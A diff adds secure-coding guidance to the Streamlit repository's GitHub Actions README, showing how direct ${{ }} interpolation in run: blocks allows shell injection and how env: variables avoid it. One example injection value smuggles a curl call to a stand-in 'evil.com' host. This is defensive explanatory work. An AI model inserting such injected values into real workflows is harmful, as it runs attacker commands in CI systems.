@@ -25,6 +25,28 @@ This folder contains all GitHub Actions workflows for the Streamlit repository. 
 
 Avoid adding new external actions unless absolutely necessary. This reduces supply chain risk and makes workflows easier to audit.
 
+### Shell Injection Prevention
+
+**Never interpolate `${{ }}` expressions directly in `run:` blocks when the value could originate from user input.** This includes `inputs.*`, `steps.*.outputs.*`, `github.head_ref`, `github.event.*.body`, `github.event.*.title`, and any value derived from PR/issue content, branch names, or commit messages.
+
+Instead, pass dynamic values through step-level `env:` variables:
+
+```yaml
+# UNSAFE — value is injected directly into the shell command:
+run: |
+  git push origin "${{ steps.create-branch.outputs.branch_name }}"
+
+# SAFE — value is passed as an environment variable:
+env:
+  BRANCH_NAME: ${{ steps.create-branch.outputs.branch_name }}
+run: |
+  git push origin "$BRANCH_NAME"
+```
+
+**Why:** GitHub Actions template expressions (`${{ }}`) are substituted _before_ the shell runs, so a malicious value like `"; curl evil.com; echo "` executes as shell commands. Environment variables are not shell-interpreted during substitution, so they are safe.
+
+**Safe contexts that don't need `env:` indirection:** `${{ }}` in `with:` parameters (parsed by YAML, not shell), `if:` conditions, and `env:` value positions are not vulnerable. GitHub-controlled constants like `github.repository`, `github.run_id`, and `github.sha` are also safe in `run:` blocks since their format is constrained.
+
 ### Best Practices
 
 - Use `workflow_call` to create reusable workflows
